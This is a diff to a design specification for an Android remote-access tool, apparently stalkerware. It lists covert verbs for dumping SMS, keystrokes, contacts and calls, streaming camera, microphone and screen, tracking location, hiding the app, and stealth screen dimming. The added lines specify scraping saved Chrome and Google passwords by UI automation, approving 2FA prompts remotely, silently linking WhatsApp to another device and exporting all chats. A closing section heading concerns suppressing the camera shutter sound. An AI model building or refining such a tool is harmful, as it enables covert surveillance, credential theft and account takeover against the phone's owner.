@@ -49,14 +49,24 @@ test target: iQOO Z5 (FunTouch OS 13 / Android 13).
 
 ### Command spec (v1 target verbs)
 list/status/devices; device info; files ls/tree/get/put/find/thumb/watch;
-sms recent/dump/send; wa dump; contacts; calls dump; notif stream/dump;
-keys dump; screen live/shot/record/start/stop; tap; type; key; unlock/lock;
-brightness get/set (0–255, stealth dimming); volume get/set/mute (streams:
-ring/media/alarm); cam snap/record (front/back); cam live --quality <low|med|high|1080p|720p|480p>
+sms recent/dump/send; contacts; calls dump; keys dump; screen
+live/shot/record/start/stop; tap; type; key; unlock/lock;
+passwords dump (Chrome + Google Password Manager via UI automation: open entry,
+tap eye, PIN fallback auth, read off screen, repeat; outputs JSON);
+auth approve (tap 2FA/confirmation prompts on device remotely); wa link
+(WhatsApp linked-devices via phone-number code, no QR); wa dump
+[--contact "<name>" | --all] (UI automation of WhatsApp's own
+Export chat incl. media, per contact or every chat; contact picked by
+name/number match); cam snap/record (front/back); cam live --quality <low|med|high|1080p|720p|480p>
 (--quality selects resolution/bitrate, modifiable per stream); mic record;
 mic live (real-time audio stream to server); loc
 once/track/history/geofence; app list/open; shell; update; destroy;
-hide/unhide; watch --notif --files --loc (persistent event stream for agents).
+hide/unhide; brightness get/set (0–255, stealth dimming); volume get/set/mute (streams:
+ring/media/alarm).
+
+Note: notification-capture verbs (notif stream/dump) are intentionally
+SKIPPED (owner decision: too complex vs value; live read + sms + auto-export
+cover the need).
 
 ### Media-capture stealth notes
 - Camera shutter sound: we capture via the Camera2 API directly (never the
